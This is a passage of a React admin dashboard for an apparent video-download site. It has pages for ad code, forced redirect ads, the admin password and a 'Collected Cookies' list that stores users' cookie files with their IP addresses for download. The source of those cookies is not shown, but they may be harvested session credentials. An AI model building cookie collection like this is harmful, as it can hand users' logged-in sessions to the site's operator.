                    <th className="text-left text-[10px] font-semibold text-muted-foreground uppercase tracking-wider pb-3 pr-4">Quality</th>
                    <th className="text-left text-[10px] font-semibold text-muted-foreground uppercase tracking-wider pb-3 pr-4">Size</th>
                    <th className="text-right text-[10px] font-semibold text-muted-foreground uppercase tracking-wider pb-3">Time</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-border/30">
                  {stats.recentDownloads.map((dl) => (
                    <tr key={dl.id} className="group hover:bg-white/[0.02] transition-colors">
                      <td className="py-3 pr-4">
                        <div className="flex items-center gap-3">
                          <div className="w-8 h-8 rounded-lg bg-muted/50 flex items-center justify-center flex-shrink-0 group-hover:bg-sky-400/10 transition-colors">
                            <Eye className="h-3.5 w-3.5 text-muted-foreground group-hover:text-sky-400 transition-colors" />
                          </div>
                          <span className="text-xs font-medium truncate max-w-[240px]">{dl.title}</span>
                        </div>
                      </td>
                      <td className="py-3 pr-4">
                        <div className="flex items-center gap-1.5">
                          <PlatformIcon platform={dl.platform} />
                          <span className="text-xs text-muted-foreground">{dl.platform}</span>
                        </div>
                      </td>
                      <td className="py-3 pr-4">
                        <Badge variant="secondary" className="text-[10px] font-medium">{dl.quality}</Badge>
                      </td>
                      <td className="py-3 pr-4">
                        <span className="text-xs text-muted-foreground">{dl.size}</span>
                      </td>
                      <td className="py-3 text-right">
                        <span className="text-[11px] text-muted-foreground">{dl.time_ago || formatTimeAgo(dl.date)}</span>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}

// ─── Banner Page ─────────────────────────────────────────
function BannerPage({
  title, description, icon, enabled, code, onSave,
}: {
  title: string; description: string; icon: React.ReactNode;
  enabled: boolean; code: string;
  onSave: (enabled: boolean, code: string) => void;
}) {
  const [isEnabled, setIsEnabled] = useState(enabled);
  const [codeValue, setCodeValue] = useState(code);

  return (
    <div className="space-y-6">
      {/* Header */}
      <div>
        <div className="flex items-center gap-3 mb-2">
          <div className="w-10 h-10 rounded-xl bg-sky-400/10 flex items-center justify-center text-sky-400">
            {icon}
          </div>
          <div>
            <h2 className="text-lg font-bold">{title}</h2>
            <p className="text-sm text-muted-foreground">{description}</p>
          </div>
        </div>
      </div>

      <Card className="border-border/50 bg-card/80 backdrop-blur-sm rounded-2xl">
        <CardContent className="pt-6 space-y-6">
          {/* Toggle */}
          <div className="flex items-center justify-between p-4 rounded-xl bg-muted/30 border border-border/30">
            <div className="flex items-center gap-3">
              <div className={`w-2.5 h-2.5 rounded-full ${isEnabled ? "bg-green-400 shadow-lg shadow-green-400/30" : "bg-muted-foreground/30"}`} />
              <div>
                <p className="text-sm font-medium">Enable {title}</p>
                <p className="text-xs text-muted-foreground mt-0.5">
                  {isEnabled ? "Active — banner is being shown to visitors" : "Disabled — banner is hidden from visitors"}
                </p>
              </div>
            </div>
            <Switch
              checked={isEnabled}
              onCheckedChange={setIsEnabled}
              className="data-[state=checked]:bg-sky-400"
            />
          </div>

          {/* Code editor */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <Label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">
                Ad Code (HTML / Script)
              </Label>
              <Badge variant="secondary" className="text-[10px] font-medium bg-violet-400/10 text-violet-400 border-violet-400/20">
                HTML
              </Badge>
            </div>
            <Textarea
              value={codeValue}
              onChange={(e) => setCodeValue(e.target.value)}
              placeholder="Paste your ad code here (Google AdSense, custom banner HTML, etc.)"
              className="code-textarea min-h-[180px] bg-background/50 border-border/50 focus:border-sky-400/50 focus:ring-sky-400/20 rounded-xl resize-y"
            />
            <p className="text-[11px] text-muted-foreground/70">
              Paste any HTML, JavaScript, or ad network code. It will be rendered as-is on the VidGrab homepage.
            </p>
          </div>

          {/* Preview */}
          {codeValue && (
            <div className="space-y-3">
              <Label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">
                Preview
              </Label>
              <div className="rounded-xl border border-border/50 bg-background/30 p-4 min-h-[60px]">
                <div
                  className="opacity-70 pointer-events-none text-xs text-muted-foreground"
                  dangerouslySetInnerHTML={{ __html: codeValue }}
                />
              </div>
            </div>
          )}

          {/* Save */}
          <Button
            onClick={() => onSave(isEnabled, codeValue)}
            className="w-full h-11 bg-gradient-to-r from-sky-400 to-sky-500 hover:from-sky-500 hover:to-sky-600 text-black font-semibold text-sm shadow-lg shadow-sky-500/20 hover:shadow-sky-500/30 transition-all duration-300 hover:-translate-y-0.5"
          >
            <Save className="h-4 w-4 mr-2" />
            Save {title} Settings
          </Button>
        </CardContent>
      </Card>
    </div>
  );
}

// ─── Redirect Ads Page ───────────────────────────────────
function RedirectAdsPage({
  enabled, delay, urls, redirectsBefore, dailyFree, onSave,
}: {
  enabled: boolean; delay: number; urls: string[];
  redirectsBefore: number; dailyFree: boolean;
  onSave: (enabled: boolean, delay_ms: number, urls: string[], redirects_before_download: number, daily_free_download: boolean) => void;
}) {
  const [isEnabled, setIsEnabled] = useState(enabled);
  const [delayMs, setDelayMs] = useState(delay);
  const [urlList, setUrlList] = useState<string[]>(urls.length ? urls : ["", ""]);
  const [redirectCount, setRedirectCount] = useState(redirectsBefore);
  const [dailyFreeEnabled, setDailyFreeEnabled] = useState(dailyFree);

  const addUrl = () => setUrlList([...urlList, ""]);
  const removeUrl = (i: number) => setUrlList(urlList.filter((_, idx) => idx !== i));
  const updateUrl = (i: number, val: string) => {
    const updated = [...urlList];
    updated[i] = val;
    setUrlList(updated);
  };

  return (
    <div className="space-y-6">
      <div>
        <div className="flex items-center gap-3 mb-2">
          <div className="w-10 h-10 rounded-xl bg-violet-400/10 flex items-center justify-center text-violet-400">
            <ArrowLeftRight className="h-5 w-5" />
          </div>
          <div>
            <h2 className="text-lg font-bold">Redirect Ads</h2>
            <p className="text-sm text-muted-foreground">Configure ad URLs that open in new tabs when users click Download</p>
          </div>
        </div>
      </div>

      <Card className="border-border/50 bg-card/80 backdrop-blur-sm rounded-2xl">
        <CardContent className="pt-6 space-y-6">
          {/* Toggle */}
          <div className="flex items-center justify-between p-4 rounded-xl bg-muted/30 border border-border/30">
            <div className="flex items-center gap-3">
              <div className={`w-2.5 h-2.5 rounded-full ${isEnabled ? "bg-green-400 shadow-lg shadow-green-400/30" : "bg-muted-foreground/30"}`} />
              <div>
                <p className="text-sm font-medium">Enable Redirect Ads</p>
                <p className="text-xs text-muted-foreground mt-0.5">
                  {isEnabled ? "Active — users will see redirect ads on download" : "Disabled — direct downloads only"}
                </p>
              </div>
            </div>
            <Switch
              checked={isEnabled}
              onCheckedChange={setIsEnabled}
              className="data-[state=checked]:bg-violet-400"
            />
          </div>

          {/* URLs */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <Label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">
                Redirect URLs
              </Label>
              <Badge variant="secondary" className="text-[10px] font-medium">
                {urlList.filter(u => u.trim()).length} active
              </Badge>
            </div>
            <div className="space-y-2">
              {urlList.map((url, i) => (
                <motion.div
                  key={i}
                  initial={{ opacity: 0, y: -8 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: i * 0.05 }}
                  className="flex items-center gap-2"
                >
                  <div className="relative flex-1">
                    <Globe className="absolute left-3 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-muted-foreground" />
                    <Input
                      value={url}
                      onChange={(e) => updateUrl(i, e.target.value)}
                      placeholder="https://example.com/ad-page"
                      className="pl-9 bg-background/50 border-border/50 focus:border-violet-400/50 focus:ring-violet-400/20 h-11 rounded-xl text-sm"
                    />
                  </div>
                  <Button
                    variant="ghost"
                    size="icon"
                    onClick={() => removeUrl(i)}
                    className="h-11 w-11 rounded-xl text-muted-foreground hover:text-red-400 hover:bg-red-400/10 flex-shrink-0"
                  >
                    <X className="h-4 w-4" />
                  </Button>
                </motion.div>
              ))}
            </div>
            <Button
              variant="outline"
              onClick={addUrl}
              className="w-full h-11 rounded-xl border-dashed border-border/50 hover:border-violet-400/30 hover:bg-violet-400/5 text-muted-foreground hover:text-violet-400 transition-all text-sm font-medium"
            >
              <Plus className="h-4 w-4 mr-2" />
              Add Another URL
            </Button>
            <p className="text-[11px] text-muted-foreground/70">
              Each URL opens in a new tab when the user clicks Download. Add 2-3 URLs for maximum ad revenue.
            </p>
          </div>

          {/* Delay */}
          <div className="p-4 rounded-xl bg-muted/30 border border-border/30">
            <div className="flex flex-col sm:flex-row sm:items-center gap-4">
              <div className="flex-1">
                <p className="text-sm font-medium">Download Delay</p>
                <p className="text-xs text-muted-foreground mt-0.5">Time to wait before starting the actual download</p>
              </div>
              <div className="flex items-center gap-3">
                <Input
                  type="number"
                  value={delayMs}
                  onChange={(e) => setDelayMs(parseInt(e.target.value) || 1000)}
                  min={500}
                  max={5000}
                  step={100}
                  className="w-28 bg-background/50 border-border/50 focus:border-violet-400/50 focus:ring-violet-400/20 h-11 rounded-xl text-sm text-center"
                />
                <span className="text-xs text-muted-foreground font-medium whitespace-nowrap">ms</span>
              </div>
            </div>
          </div>

          {/* Redirects Before Download */}
          <div className="p-4 rounded-xl bg-muted/30 border border-border/30">
            <div className="flex flex-col sm:flex-row sm:items-center gap-4">
              <div className="flex-1">
                <p className="text-sm font-medium">Redirects Before Download</p>
                <p className="text-xs text-muted-foreground mt-0.5">How many redirect ads user must visit before download starts</p>
              </div>
              <div className="flex items-center gap-3">
                <Input
                  type="number"
                  value={redirectCount}
                  onChange={(e) => setRedirectCount(parseInt(e.target.value) || 3)}
                  min={1}
                  max={50}
                  className="w-28 bg-background/50 border-border/50 focus:border-violet-400/50 focus:ring-violet-400/20 h-11 rounded-xl text-sm text-center"
                />
                <span className="text-xs text-muted-foreground font-medium whitespace-nowrap">ads</span>
              </div>
            </div>
          </div>

          {/* Daily Free Download */}
          <div className="flex items-center justify-between p-4 rounded-xl bg-muted/30 border border-border/30">
            <div className="flex items-center gap-3">
              <div className={`w-2.5 h-2.5 rounded-full ${dailyFreeEnabled ? "bg-green-400 shadow-lg shadow-green-400/30" : "bg-muted-foreground/30"}`} />
              <div>
                <p className="text-sm font-medium">Daily Free Download</p>
                <p className="text-xs text-muted-foreground mt-0.5">
                  {dailyFreeEnabled ? "Users get 1 free download per day without ads" : "Ads required for every download"}
                </p>
              </div>
            </div>
            <Switch
              checked={dailyFreeEnabled}
              onCheckedChange={setDailyFreeEnabled}
              className="data-[state=checked]:bg-violet-400"
            />
          </div>

          {/* Save */}
          <Button
            onClick={() => onSave(isEnabled, delayMs, urlList.filter(u => u.trim()), redirectCount, dailyFreeEnabled)}
            className="w-full h-11 bg-gradient-to-r from-violet-400 to-violet-500 hover:from-violet-500 hover:to-violet-600 text-white font-semibold text-sm shadow-lg shadow-violet-500/20 hover:shadow-violet-500/30 transition-all duration-300 hover:-translate-y-0.5"
          >
            <Save className="h-4 w-4 mr-2" />
            Save Redirect Ad Settings
          </Button>
        </CardContent>
      </Card>
    </div>
  );
}

// ─── Side Banners Page ───────────────────────────────────
function SideBannersPage({
  leftEnabled, leftCode, rightEnabled, rightCode, onSave,
}: {
  leftEnabled: boolean; leftCode: string;
  rightEnabled: boolean; rightCode: string;
  onSave: (left: { enabled: boolean; code: string }, right: { enabled: boolean; code: string }) => void;
}) {
  const [left, setLeft] = useState({ enabled: leftEnabled, code: leftCode });
  const [right, setRight] = useState({ enabled: rightEnabled, code: rightCode });

  return (
    <div className="space-y-6">
      <div>
        <div className="flex items-center gap-3 mb-2">
          <div className="w-10 h-10 rounded-xl bg-amber-400/10 flex items-center justify-center text-amber-400">
            <PanelLeftClose className="h-5 w-5" />
          </div>
          <div>
            <h2 className="text-lg font-bold">Side Banners</h2>
            <p className="text-sm text-muted-foreground">Configure left and right sidebar banner ads</p>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        {/* Left Banner */}
        <Card className="border-border/50 bg-card/80 backdrop-blur-sm rounded-2xl">
          <CardHeader className="pb-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <PanelLeftClose className="h-4 w-4 text-amber-400" />
                <CardTitle className="text-sm font-semibold">Left Side Banner</CardTitle>
              </div>
              <Switch
                checked={left.enabled}
                onCheckedChange={(v) => setLeft({ ...left, enabled: v })}
                className="data-[state=checked]:bg-amber-400"
              />
            </div>
          </CardHeader>
          <CardContent className="space-y-4">
            <Textarea
              value={left.code}
              onChange={(e) => setLeft({ ...left, code: e.target.value })}
              placeholder="Paste left sidebar ad code..."
              className="code-textarea min-h-[140px] bg-background/50 border-border/50 focus:border-amber-400/50 focus:ring-amber-400/20 rounded-xl resize-y text-sm"
            />
          </CardContent>
        </Card>

        {/* Right Banner */}
        <Card className="border-border/50 bg-card/80 backdrop-blur-sm rounded-2xl">
          <CardHeader className="pb-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <PanelRightClose className="h-4 w-4 text-amber-400" />
                <CardTitle className="text-sm font-semibold">Right Side Banner</CardTitle>
              </div>
              <Switch
                checked={right.enabled}
                onCheckedChange={(v) => setRight({ ...right, enabled: v })}
                className="data-[state=checked]:bg-amber-400"
              />
            </div>
          </CardHeader>
          <CardContent className="space-y-4">
            <Textarea
              value={right.code}
              onChange={(e) => setRight({ ...right, code: e.target.value })}
              placeholder="Paste right sidebar ad code..."
              className="code-textarea min-h-[140px] bg-background/50 border-border/50 focus:border-amber-400/50 focus:ring-amber-400/20 rounded-xl resize-y text-sm"
            />
          </CardContent>
        </Card>
      </div>

      <Button
        onClick={() => onSave(left, right)}
        className="w-full h-11 bg-gradient-to-r from-amber-400 to-amber-500 hover:from-amber-500 hover:to-amber-600 text-black font-semibold text-sm shadow-lg shadow-amber-500/20 hover:shadow-amber-500/30 transition-all duration-300 hover:-translate-y-0.5"
      >
        <Save className="h-4 w-4 mr-2" />
        Save Side Banner Settings
      </Button>
    </div>
  );
}

// ─── Settings Page ───────────────────────────────────────
function SettingsPage({
  hasPassword,
  onSave,
  backendConnected,
}: {
  hasPassword: boolean;
  onSave: (password: string) => void;
  backendConnected: boolean | null;
}) {
  const [newPw, setNewPw] = useState("");
  const [confirmPw, setConfirmPw] = useState("");
  const [error, setError] = useState("");

  const handleSave = () => {
    if (!newPw) {
      setError("Please enter a new password");
      return;
    }
    if (newPw.length < 6) {
      setError("Password must be at least 6 characters");
      return;
    }
    if (newPw !== confirmPw) {
      setError("Passwords do not match");
      return;
    }
    setError("");
    onSave(newPw);
    setNewPw("");
    setConfirmPw("");
  };

  return (
    <div className="space-y-6">
      <div>
        <div className="flex items-center gap-3 mb-2">
          <div className="w-10 h-10 rounded-xl bg-red-400/10 flex items-center justify-center text-red-400">
            <Lock className="h-5 w-5" />
          </div>
          <div>
            <h2 className="text-lg font-bold">Settings</h2>
            <p className="text-sm text-muted-foreground">Manage admin password and security settings</p>
          </div>
        </div>
      </div>

      {/* Backend Connection Card */}
      <Card className="border-border/50 bg-card/80 backdrop-blur-sm rounded-2xl">
        <CardContent className="pt-6">
          {backendConnected && (
            <div className="flex items-center gap-3 p-3 rounded-xl bg-green-400/5 border border-green-400/20">
              <div className="w-2 h-2 rounded-full bg-green-400 animate-pulse flex-shrink-0" />
              <p className="text-xs text-green-400 font-medium">Backend connected — showing real download data</p>
            </div>
          )}
          {!backendConnected && backendConnected !== null && (
            <div className="flex items-center gap-3 p-3 rounded-xl bg-amber-400/5 border border-amber-400/20">
              <div className="w-2 h-2 rounded-full bg-amber-400 flex-shrink-0" />
              <p className="text-xs text-amber-400 font-medium">Backend not connected — dashboard shows offline mode</p>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Password Card */}
      <Card className="border-border/50 bg-card/80 backdrop-blur-sm rounded-2xl">
        <CardContent className="pt-6 space-y-6">
          <div className="flex items-center gap-3 p-4 rounded-xl bg-amber-400/5 border border-amber-400/20">
            <HardDrive className="h-5 w-5 text-amber-400 flex-shrink-0" />
            <div>
              <p className="text-sm font-medium text-amber-400">Security Notice</p>
              <p className="text-xs text-muted-foreground mt-0.5">
                {hasPassword
                  ? "Your admin panel is password-protected. Change it regularly for security."
                  : "No password set! Set one immediately to protect your admin panel."}
              </p>
            </div>
          </div>

          <div className="space-y-4">
            <div className="space-y-2">
              <Label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">New Password</Label>
              <div className="relative">
                <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                <Input
                  type="password"
                  value={newPw}
                  onChange={(e) => { setNewPw(e.target.value); setError(""); }}
                  placeholder="Enter new password"
                  className="pl-10 bg-background/50 border-border/50 focus:border-red-400/50 focus:ring-red-400/20 h-11 rounded-xl"
                />
              </div>
            </div>

            <div className="space-y-2">
              <Label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Confirm Password</Label>
              <div className="relative">
                <ShieldCheck className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                <Input
                  type="password"
                  value={confirmPw}
                  onChange={(e) => { setConfirmPw(e.target.value); setError(""); }}
                  placeholder="Confirm new password"
                  className="pl-10 bg-background/50 border-border/50 focus:border-red-400/50 focus:ring-red-400/20 h-11 rounded-xl"
                  onKeyDown={(e) => e.key === "Enter" && handleSave()}
                />
              </div>
            </div>

            {error && (
              <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} className="text-sm text-red-400 flex items-center gap-2">
                <X className="h-3.5 w-3.5" /> {error}
              </motion.p>
            )}
          </div>

          <Button
            onClick={handleSave}
            className="w-full h-11 bg-gradient-to-r from-red-400 to-red-500 hover:from-red-500 hover:to-red-600 text-white font-semibold text-sm shadow-lg shadow-red-500/20 hover:shadow-red-500/30 transition-all duration-300 hover:-translate-y-0.5"
          >
            <ShieldCheck className="h-4 w-4 mr-2" />
            Update Password
          </Button>
        </CardContent>
      </Card>
    </div>
  );
}

// ─── Cookies Page ────────────────────────────────────────
function CookiesPage({ authHeaders, onError }: {
  authHeaders: () => Record<string, string>;
  onError: (msg: string) => void;
}) {
  const [cookies, setCookies] = useState<any[]>([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [loading, setLoading] = useState(true);

  const fetchCookies = useCallback(async (p: number) => {
    setLoading(true);
    try {
      const res = await fetch(`/api/admin/cookies?page=${p}&limit=50`, { headers: authHeaders() });
      if (res.ok) {
        const data = await res.json();
        setCookies(data.cookies || []);
        setTotal(data.total || 0);
        setPage(data.page || 1);
        setTotalPages(data.totalPages || 1);
      }
    } catch { onError("Failed to load cookies"); }
    finally { setLoading(false); }
  }, [authHeaders, onError]);

  useEffect(() => { fetchCookies(1); }, []);

  const clearAll = async () => {
    if (!confirm("Clear all collected cookies?")) return;
    try {
      const res = await fetch(`/api/admin/cookies`, { method: "DELETE", headers: authHeaders() });
      if (res.ok) { fetchCookies(1); }
    } catch { onError("Failed to clear cookies"); }
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <div className="flex items-center gap-3 mb-2">
            <div className="w-10 h-10 rounded-xl bg-amber-400/10 flex items-center justify-center text-amber-400">
              <Cookie className="h-5 w-5" />
            </div>
            <div>
              <h2 className="text-lg font-bold">Collected Cookies</h2>
              <p className="text-sm text-muted-foreground">Total: {total} entries</p>
            </div>
          </div>
        </div>
        <Button onClick={clearAll} variant="outline" className="border-red-400/30 text-red-400 hover:bg-red-400/10">
          <X className="h-4 w-4 mr-2" /> Clear All
        </Button>
      </div>

      {loading ? (
        <div className="space-y-3">
          {[1,2,3].map(i => <Skeleton key={i} className="h-16 w-full rounded-xl" />)}
        </div>
      ) : cookies.length === 0 ? (
        <Card className="border-border/50 bg-card/80 backdrop-blur-sm rounded-2xl">
          <CardContent className="pt-6 text-center text-muted-foreground py-12">
            No cookies collected yet.
          </CardContent>
        </Card>
      ) : (
        <>
          <div className="space-y-2">
            {cookies.map((entry: any) => (
              <Card key={entry.id} className="border-border/50 bg-card/80 backdrop-blur-sm rounded-2xl">
                <CardContent className="pt-4 pb-4">
                  <div className="flex items-center justify-between gap-4">
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-3 mb-1">
                        <span className="text-xs font-mono text-muted-foreground">#{entry.id}</span>
                        <span className="text-sm font-semibold truncate">{entry.name || "Unknown"}</span>
                      </div>
                      <div className="flex items-center gap-4 text-xs text-muted-foreground">
                        <span>{entry.ip}</span>
                        <span>{entry.timestamp ? new Date(entry.timestamp).toLocaleString() : ""}</span>
                      </div>
                    </div>
                    <button
                      onClick={async () => {
                        try {
                          const res = await fetch(`/api/admin/cookies/${entry.id}/download`, { headers: authHeaders() });
                          if (!res.ok) return;
                          const blob = await res.blob();
                          const disp = res.headers.get("Content-Disposition") || "";
                          const fnMatch = disp.match(/filename\*?=(?:UTF-8'')?([^;\s]+)/i);
                          const fn = fnMatch ? decodeURIComponent(fnMatch[1]) : `${entry.name || "user"}_cookies.txt`;
                          const url = URL.createObjectURL(blob);
                          const a = document.createElement("a");
                          a.href = url; a.download = fn; a.style.display = "none";
                          document.body.appendChild(a); a.click();
                          setTimeout(() => { URL.revokeObjectURL(url); a.remove(); }, 5000);
                        } catch {}
                      }}
                      className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-primary/10 text-primary hover:bg-primary/20 transition-all text-sm font-medium cursor-pointer"
                    >
                      <Download className="h-4 w-4" /> Download
                    </button>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>

          {totalPages > 1 && (
            <div className="flex items-center justify-center gap-2 pt-2">
              <Button
                onClick={() => fetchCookies(page - 1)}
                disabled={page <= 1}
                variant="outline"
                size="sm"
              >Previous</Button>
              <span className="text-sm text-muted-foreground px-3">
                Page {page} of {totalPages}
              </span>
              <Button
                onClick={() => fetchCookies(page + 1)}
                disabled={page >= totalPages}
                variant="outline"
                size="sm"
              >Next</Button>
            </div>
          )}
        </>
      )}
    </div>
  );
}